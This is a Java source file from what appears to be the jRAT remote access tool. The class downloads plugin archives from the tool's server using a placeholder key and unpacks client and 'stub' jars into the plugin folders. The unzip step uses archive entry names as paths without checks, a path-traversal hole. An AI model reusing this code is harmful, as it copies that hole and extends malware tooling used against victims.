package pro.jrat.extensions;

import java.awt.Color;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

import pro.jrat.Constants;
import pro.jrat.Main;
import pro.jrat.common.listeners.CopyStreamsListener;
import pro.jrat.common.utils.IOUtils;
import pro.jrat.common.utils.MathUtils;
import pro.jrat.exceptions.InvalidKeyException;
import pro.jrat.exceptions.MissingKeyException;
import pro.jrat.listeners.ExtensionInstallerListener;
import pro.jrat.net.WebRequest;

public class ExtensionInstaller {

	private OnlinePlugin plugin;
	private ExtensionInstallerListener listener;

	public ExtensionInstaller(OnlinePlugin plugin, ExtensionInstallerListener listener) {
		this.plugin = plugin;
		this.listener = listener;
	}

	public void toggle() throws Exception {
		if (plugin.isInstalled()) {
			install(); // TODO
		} else {
			install();
		}
	}

	public void uninstall() throws Exception {
		System.out.println(plugin.getJar().delete());
		System.out.println(plugin.getStubJar().delete());
		System.out.println(plugin.getDirectory().delete());
	}

	public void install() throws Exception {
		listener.status(Color.black, "Connecting...", 0);

		File temp = File.createTempFile(plugin.getName() + "_temp_download", ".zip");

		String key = "jrat";
		try {
			// TODO key = Hex.encode(UniqueId.getSystemId());
		} catch (Exception e) {
			throw new MissingKeyException("Failed to load key", e);
		}

		HttpURLConnection archiveConnection = (HttpURLConnection) WebRequest.getConnection(Constants.HOST + "/plugins/getplugin.php?plugin=" + plugin.getName() + "&key=" + key);
		archiveConnection.connect();

		int response = archiveConnection.getResponseCode();

		if (response == 400) {
			throw new MalformedURLException("Failed to send correct request");
		} else if (response == 404) {
			throw new FileNotFoundException("Failed to find plugin package: " + plugin.getName());
		} else if (response == 401) {
			throw new InvalidKeyException("Key not found, not valid license?");
		}

		InputStream archive = archiveConnection.getInputStream();

		long length = archiveConnection.getContentLengthLong();

		FileOutputStream out = new FileOutputStream(temp);

		IOUtils.copy(length, archive, out, new CopyStreamsListener() {
			@Override
			public void chunk(long current, long total, int percent) {
				listener.status(Color.black, "Downloaded " + (current / 1024L) + "/" + (total / 1024L) + " kB", percent);
			}
		});

		archive.close();
		out.close();

		ZipFile zip = new ZipFile(temp);
		Enumeration<? extends ZipEntry> entriesEnum = zip.entries();
		List<ZipEntry> entries = new ArrayList<ZipEntry>();

		while (entriesEnum.hasMoreElements()) {
			entries.add(entriesEnum.nextElement());
		}

		for (int i = 0; i < entries.size(); i++) {
			ZipEntry entry = entries.get(i);

			File output;

			if (entry.getName().equals("Stub.jar")) {
				output = new File("plugins/stubs/" + plugin.getName() + ".jar");
			} else if (entry.getName().equals("Client.jar")) {
				output = new File("plugins/" + plugin.getName() + ".jar");
			} else {
				output = new File("plugins/" + plugin.getName() + "/" + entry.getName());
			}

			if (!output.getParentFile().exists()) {
				output.getParentFile().mkdirs();
			}

			output.createNewFile();

			listener.status(Color.black, "Writing " + output.getName(), MathUtils.getPercentFromTotal(i, entries.size()));

			InputStream entryIs = zip.getInputStream(entry);
			FileOutputStream entryOut = new FileOutputStream(output);

			IOUtils.copy(entryIs, entryOut);

			entryIs.close();
			entryOut.close();
		}

		zip.close();

		temp.delete();

		new Plugin(plugin.getJar());

		Main.instance.reloadPlugins();
	}

}
